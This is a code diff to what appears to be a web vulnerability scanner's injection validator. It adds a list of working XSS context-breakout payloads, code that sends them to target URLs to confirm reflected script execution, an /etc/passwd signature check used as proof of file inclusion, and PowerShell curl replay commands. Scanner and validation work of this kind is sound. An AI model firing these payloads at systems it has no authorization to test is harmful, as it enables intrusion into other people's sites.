@@ -116,17 +116,38 @@ def file_signature(text: str) -> str:
     return ""
 
 
-def replay_command(requests: dict[str, str], expected: str) -> str:
+def replay_command(requests: dict[str, str], expected: str, proof: str = "") -> str:
+    """PowerShell (5.1 and 7) replay that prints the evidence, not only saves it.
+
+    Each request prints its status line, the lines containing the proof
+    (literal match) or the first body lines, and the total time, so control
+    and probe can be compared directly in the console.
+    """
     def quote(s):
-        return "'" + s.replace("'", "''") + "'"
-    lines = ["# PowerShell: compare bodies, HTTP codes and timings; " + expected]
+        return "'" + str(s).replace("'", "''") + "'"
+    lines = [f"# Scan Titan: reproducir {expected}. Comparar la salida de control y prueba."]
     for label, url in requests.items():
         if label.endswith("_url"):
             label = label[:-4]
         label = re.sub(r"[^a-z0-9_]", "_", label.lower())
-        lines.append(f"curl.exe -k -sS --max-time 30 -D {label}.headers.txt -o {label}.body.txt -w "
-                     f"'HTTP=%{{http_code}} bytes=%{{size_download}} time=%{{time_total}}\\n' -- {quote(url)}")
+        show = (f"$l | Select-String -SimpleMatch {quote(proof)} | Select-Object -First 5; " if proof
+                else "$l | Select-Object -First 25; ")
+        lines.append(
+            f"Write-Host '[{label}]'; "
+            f"$l = @(curl.exe -k -sS -i --max-time 30 -w 'ST_TIME=%{{time_total}}s' -- {quote(url)} 2>&1); "
+            f"$l[0]; {show}$l | Select-String -SimpleMatch 'ST_TIME='")
     return "\n".join(lines)
+
+
+def proof_text(family: str, validation: dict, payload: str) -> str:
+    """Literal text whose presence in the probe output demonstrates the finding."""
+    if family == "xss":
+        return str(validation.get("payload") or payload or "")
+    if family == "lfi":
+        return "root:x:0:0" if "passwd" in str(validation.get("proof", "")) else ""
+    if family == "sqli" and validation.get("reason") == "differential_database_error":
+        return str(validation.get("proof", ""))[:60]
+    return ""
 
 
 class InjectionValidator:
@@ -157,7 +178,13 @@ class InjectionValidator:
                 finding.evidence_strength = "strong"
                 finding.false_positive_risk = "low"
                 finding.evidence += " | Independent replay: " + str(finding.validation)
-                finding.manual_command = replay_command(finding.validation.get("requests", {}), finding.validation["reason"])
+                if finding.validation.get("payload") and finding.validation.get("probe_url"):
+                    finding.url = finding.validation["probe_url"]
+                    finding.payload = finding.validation["payload"]
+                finding.title = re.sub(r"\s+candidate(?=:)", "", finding.title, flags=re.I)
+                finding.manual_command = replay_command(finding.validation.get("requests", {}),
+                                                        finding.validation["reason"],
+                                                        proof_text(family, finding.validation, finding.payload))
             else:
                 ctx.recon.setdefault("injection_triage", []).append({
                     "title": finding.title, "url": finding.url, "param": finding.param,
@@ -213,6 +240,15 @@ class InjectionValidator:
                 # Strong proof takes precedence over the similarity heuristic.
                 verdict.update(state="CONFIRMED", reason="unsafe_html_reflection", proof=proof)
                 return verdict
+            if param:
+                # The detector may have picked a payload for the wrong context
+                # (attribute breakout reflected as text). Try context payloads;
+                # confirmation still requires a parsed executable element.
+                escalated = await self.escalate_xss(ctx, f.url, param, baseline)
+                if escalated:
+                    verdict.update(escalated)
+                    verdict["requests"] = {"baseline_url": baseline_url, "probe_url": escalated["probe_url"]}
+                    return verdict
         elif family == "lfi":
             proof = file_signature(probe.text)
             if proof and not file_signature(baseline.text):
@@ -251,6 +287,32 @@ class InjectionValidator:
         else:
             verdict["reason"] = "no_reproducible_injection_evidence"
         return verdict
+
+    XSS_CONTEXT_PAYLOADS = (
+        "<svg onload=alert({m})>",                 # HTML text context
+        "\"><svg onload=alert({m})>",              # double-quoted attribute
+        "'><svg onload=alert({m})>",               # single-quoted attribute
+        "</script><svg onload=alert({m})>",        # inside a script block
+        "--><svg onload=alert({m})>",              # inside an HTML comment
+        "</textarea><svg onload=alert({m})>",      # inside textarea/title
+    )
+
+    async def escalate_xss(self, ctx, url, param, baseline):
+        marker = str(int(hashlib.sha256(f"{url}|{param}".encode()).hexdigest()[:8], 16) % 900000 + 100000)
+        for template in self.XSS_CONTEXT_PAYLOADS:
+            candidate = template.format(m=marker)
+            probe_url = with_parameter(url, param, candidate)
+            response = await ctx.http.request("GET", probe_url, allow_redirects=False)
+            if not response or AdaptiveResponseGuard.looks_blocked(response):
+                continue
+            proof = unsafe_reflection(response, candidate)
+            if not proof or candidate in baseline.text:
+                continue
+            repeat = await ctx.http.request("GET", probe_url, allow_redirects=False)
+            if repeat and unsafe_reflection(repeat, candidate) == proof:
+                return {"state": "CONFIRMED", "reason": "unsafe_html_reflection_context_payload", "proof": proof,
+                        "payload": candidate, "probe_url": probe_url}
+        return None
 
     async def boolean(self, ctx, f, baseline, payload, verdict):
         pairs = f.payload.split(" / ", 1)
